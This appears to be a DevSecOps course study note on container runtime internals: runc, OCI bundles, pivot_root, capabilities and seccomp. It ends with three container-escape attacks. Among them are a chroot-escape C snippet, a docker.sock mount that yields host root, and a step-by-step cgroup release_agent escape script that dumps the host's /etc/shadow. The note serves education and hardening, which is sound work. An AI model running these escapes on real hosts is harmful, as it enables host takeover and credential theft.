---
title: "Rabbit Hole 02: Container Runtime Internals, Syscalls & Escapes"
course_code: "INT378"
category: "rabbit-hole-deep-dive"
hub: "[[INT378 Master Strategy & Curriculum Roadmap]]"
compendium: "[[00 - The DevOps Rabbit Hole Compendium]]"
related_units:
  - "[[Unit 1 - Advanced Cloud Infrastructure & Services]]"
  - "[[Unit 5 - DevSecOps, IAM and Cloud Security]]"
related_labs:
  - "[[Lab 04 - Docker Architecture, Containerization & Hub]]"
  - "[[Lab 07 - DevSecOps Pipeline (SAST, Trivy & Secret Mgmt)]]"
interview_focus:
  - "runc OCI bundle execution (config.json + rootfs)"
  - "pivot_root vs chroot security boundaries"
  - "Linux capabilities dropping (CAP_SYS_ADMIN)"
  - "Seccomp BPF system call filtering"
  - "Container escape mechanics (Docker socket, --privileged, release_agent)"
tags:
  - int378/rabbit-holes
  - containers
  - docker
  - runc
  - security
  - syscalls
  - container-escapes
last_updated: 2026-11-20
---

# Rabbit Hole 02: Container Runtime Internals, Syscalls & Escapes

When you type `docker run`, Docker does not create a container directly. It hands an **OCI Bundle** to a minimalist binary written in Go called **`runc`**.

`runc` is the real engine of the containerized world. Understanding how `runc` uses Linux kernel syscalls to construct the container sandbox—and how misconfigurations permit attackers to execute **container escapes**—is essential for DevSecOps mastery.

---

## 1. The Anatomy of an OCI Bundle

`runc` knows nothing about Dockerfiles, networks, or image registries. It expects a single directory on disk containing two things:

```text
my-container-bundle/
├── config.json   <-- JSON specification of namespaces, cgroups, capabilities
└── rootfs/       <-- Raw unpacked directory of files (/bin, /etc, /usr, /app)
```

```bash
# You can generate this manually without Docker!
runc spec
# Spawns a template config.json
runc run my-container-id
```

---

## 2. The Exact Syscall Execution Sequence of `runc`

When `runc` spawns a container, it executes a strict sequence of C system calls inside the Linux kernel:

```mermaid
sequenceDiagram
    autonumber
    actor runc as runc (Host Process)
    participant Kernel as Linux Kernel

    runc->>Kernel: 1. clone(CLONE_NEWPID | CLONE_NEWNET | CLONE_NEWNS | ...)
    Note over Kernel: Creates child process inside 7 isolated namespaces
    runc->>Kernel: 2. Writes PID to /sys/fs/cgroup/cpu,memory/cgroup.procs
    Note over Kernel: Enforces CFS quotas and OOM limits
    runc->>Kernel: 3. pivot_root(new_root, put_old)
    Note over Kernel: Swaps root filesystem from host / to container rootfs
    runc->>Kernel: 4. umount2(put_old, MNT_DETACH)
    Note over Kernel: Host filesystem completely unmounted and inaccessible!
    runc->>Kernel: 5. capset(drop CAP_SYS_ADMIN, CAP_SYS_MODULE, ...)
    Note over Kernel: Strips dangerous kernel capabilities
    runc->>Kernel: 6. prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, bpf_program)
    Note over Kernel: Restricts allowed Linux system calls
    runc->>Kernel: 7. setuid(10001) && setgid(10001)
    runc->>Kernel: 8. execve("/app/mybinary", args, env)
    Note over Kernel: Replaces runc process memory with application code!
```

### 2.1 The Critical Difference: `pivot_root` vs. `chroot`
Why does modern container runtimes mandate `pivot_root` instead of the classic Linux `chroot`?

> [!WARNING]
> **Why `chroot` is Insecure**:
> In a traditional `chroot` jail, a root user can easily escape. If the process has access to a file descriptor outside the chroot, it can execute:
> ```c
> int fd = open("..", O_DIRECTORY);
> chroot("subdir");
> fchdir(fd); // Moves working directory outside the chroot jail!
> chroot("."); // Makes the true host filesystem the new root!
> ```
> **How `pivot_root` Fixes This**:
> `pivot_root` swaps the entire Virtual Filesystem (VFS) mount table. It moves the host root mount point to an ephemeral directory, mounts the container `rootfs` as the permanent `/`, and immediately invokes `umount2()` on the old root. There are **no remaining file descriptors or parent mount pointers** connecting back to the host filesystem.

---

## 3. Defense Layer 1: Dropping Linux Capabilities

In traditional Unix, permissions were binary: you were either regular unprivileged user (`UID > 0`) or the all-powerful `root` (`UID 0`).

Linux broke root's god-mode into **~40 distinct capabilities** (defined in `<linux/capability.h>`).

```mermaid
flowchart TD
    subgraph RootCapabilities["Linux Capabilities Breakdown"]
        Dangerous["Dangerous Capabilities (DROPPED by Docker by default)<br>- CAP_SYS_ADMIN (Mount disks, configure cgroups, override ACLs)<br>- CAP_SYS_MODULE (Insert raw kernel modules .ko)<br>- CAP_SYS_RAWIO (Direct access to physical RAM /dev/mem)<br>- CAP_SYS_PTRACE (Trace/hijack memory of other host processes)"]
        Retained["Benign Capabilities (RETAINED by default)<br>- CAP_NET_BIND_SERVICE (Bind to privileged ports < 1024)<br>- CAP_CHOWN (Change file ownership inside container)<br>- CAP_SETUID / CAP_SETGID (Switch users inside container)"]
    end
```

If an attacker achieves remote code execution as `root` inside an unhardened container, but `CAP_SYS_ADMIN` and `CAP_SYS_MODULE` are dropped, **they cannot load malicious kernel modules or mount host disks**.

---

## 4. Defense Layer 2: Seccomp (SECure COMPuting with BPF)

Linux provides **~450 system calls** (`read`, `write`, `open`, `fork`, `reboot`, `swapon`, `kexec_load`).

A web application only needs about 50 of them. Why should a Python Flask container ever be allowed to call `reboot()` or `swapon()`?

```mermaid
flowchart LR
    App["Application Process in Container"] -->|"Syscall: reboot()"| Seccomp["Seccomp BPF Filter Engine"]
    Seccomp -->|"Matched in Blacklist"| Deny["Returns EPERM (Operation Not Permitted)<br>Syscall Blocked by Kernel!"]
    
    App -->|"Syscall: write()"| Seccomp
    Seccomp -->|"Matched in Whitelist"| Allow["Syscall Executed by Kernel"]
```

- Docker's default seccomp profile applies a **Berkeley Packet Filter (BPF)** program to the container's process tree.
- It blocks approximately **44 dangerous syscalls**, including:
  - `reboot`: Prevents container from rebooting the physical host server.
  - `kexec_load`: Prevents loading a new Linux kernel.
  - `ptrace`: Prevents attaching debuggers to other processes on the host.
  - `sys_chroot`: Prevents altering filesystem root jails.

---

## 5. Container Breakout Exploits: The 3 Classic Attacks

During security reviews and Senior DevOps interviews, you will be evaluated on your understanding of **Container Escapes**.

### Attack 1: The Docker Socket Mount Anti-Pattern
In CI/CD environments, developers often mount `/var/run/docker.sock` into a Jenkins runner container so the runner can execute `docker build`.

```bash
# THE CRITICAL VULNERABILITY:
docker run -it -v /var/run/docker.sock:/var/run/docker.sock alpine sh
```

```mermaid
sequenceDiagram
    autonumber
    actor Attacker as Attacker inside Container
    participant Sock as /var/run/docker.sock
    participant Daemon as Host Docker Daemon (Running as Host Root)
    participant Host as Host Bare-Metal OS

    Attacker->>Sock: Sends REST API request: "docker run -v /:/host-root alpine chroot /host-root"
    Sock->>Daemon: Daemon processes command with full host privileges
    Daemon->>Host: Mounts physical server root / into a new container
    Host-->>Attacker: Spawns shell with FULL UNRESTRICTED ROOT ACCESS ON HOST!
```

> [!CAUTION]
> Mounting `/var/run/docker.sock` into an untrusted container is equivalent to giving the container **passwordless `sudo` access to the host server**. Never use Docker-in-Docker via socket mounting in multi-tenant environments; use unprivileged rootless builders like **Google Kaniko** or **Buildah**.

---

### Attack 2: The `--privileged` Flag & `cgroup release_agent` Escape
When a developer runs `docker run --privileged`, Docker:
1. Disables all Seccomp BPF filters.
2. Disables AppArmor / SELinux profiles.
3. Grants all 40 Linux kernel capabilities (including `CAP_SYS_ADMIN`).
4. Exposes all host devices under `/dev/` to the container.

#### The Exploit Mechanism:
In `cgroups v1`, when all processes in a control group exit, the kernel executes a script configured in the cgroup's `release_agent` file. **The kernel executes this script as host root in the host namespace!**

```bash
# Inside the privileged container:
# 1. Mount host cgroup hierarchy
mkdir /tmp/cgroup && mount -t cgroup -o memory cgroup /tmp/cgroup
mkdir /tmp/cgroup/x

# 2. Enable notify_on_release
echo 1 > /tmp/cgroup/x/notify_on_release

# 3. Write payload script that dumps host /etc/shadow
echo '#!/bin/sh' > /cmd
echo 'cat /etc/shadow > /tmp/stolen_passwords' >> /cmd
chmod +x /cmd

# 4. Point host release_agent to the script on disk
HOST_PATH=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$HOST_PATH/cmd" > /tmp/cgroup/release_agent

# 5. Trigger release_agent execution by spawning and instantly killing a child process
sh -c "echo \$\$ > /tmp/cgroup/x/cgroup.procs"

# The host kernel executes /cmd on the bare-metal server!
```

---

### Attack 3: CVE-2019-5736 (Overwriting the Host `runc` Binary)
- In early versions of Docker, when an administrator executed `docker exec -it <container> sh`, the host `runc` process temporarily entered the container's namespaces while retaining a file descriptor to its own executable (`/proc/self/exe`).
- A malicious container process could open `/proc/self/exe` in write-only mode (`O_WRONLY`) and **overwrite the host's `/usr/bin/runc` binary with malicious code**.
- The next time the administrator or Docker daemon launched *any* container on the host, the attacker's code executed as host root!
- *Patch*: Modern runc creates an anonymous temporary copy (`memfd_create`) of itself in memory before attaching to containers.
